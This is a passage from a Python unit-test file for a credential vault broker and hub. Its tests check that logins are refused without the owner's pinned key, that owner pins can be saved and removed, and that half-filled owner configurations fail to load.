
    def test_a_broker_with_no_key_of_the_owner_hands_nothing_over(self):
        self.broker.close()
        plain = {k: v for k, v in self.conf.items() if k not in vault.OWNER_PIN_KEYS}
        broker = vault.Broker(plain).open()
        threading.Thread(target=broker.serve, daemon=True).start()
        self.addCleanup(broker.close)
        job = self.job()
        with self.assertRaises(fleet.Refused) as caught:
            fleet.vault_call({"op": "handover", "job": job})
        self.assertIn("this machine's vault holds no key of the owner, so it hands no login over", str(caught.exception))
        self.assertEqual(self.reads(), [])                      # the login was never opened
        self.assertIsNone(self.released(job))                   # and the hub's one-use job was not asked for

    def test_the_hub_keeps_the_owners_pin_as_it_came_and_an_unpin_ends_it(self):
        pin = owner_pin("studio", STUDIO_KEY)
        with patch.object(hub, "central_call", return_value={"ok": True, "kind": "pin", "saved": "new",
                                                            "machine": "studio", "recipient": STUDIO_KEY}):
            hub.central_statement(pin)
        self.assertEqual(hub.owner_pin("studio"), pin)
        with patch.object(hub, "central_call", return_value={"ok": True, "kind": "unpin", "saved": "removed",
                                                            "machine": "studio"}):
            hub.central_statement({"statement": vault.canonical({"v": 1, "kind": "unpin", "fleet": "0123456789abcdef",
                                                                 "machine": "studio", "at": 1793600001}),
                                   "signature": "MEUCIQ=="})
        self.assertIsNone(hub.owner_pin("studio"))

    def test_a_configuration_with_one_of_the_two_owner_fields_does_not_load(self):
        for key in vault.OWNER_PIN_KEYS:
            path = self.dir / f"half-{key}.json"
            path.write_text(json.dumps({k: v for k, v in self.conf.items() if k != key}))
            path.chmod(0o644)
            with self.assertRaises(SystemExit):
                vault.load_config(str(path))
        self.assertEqual(OWNER, self.conf["owner_keys"][0])


if __name__ == "__main__":
    unittest.main()
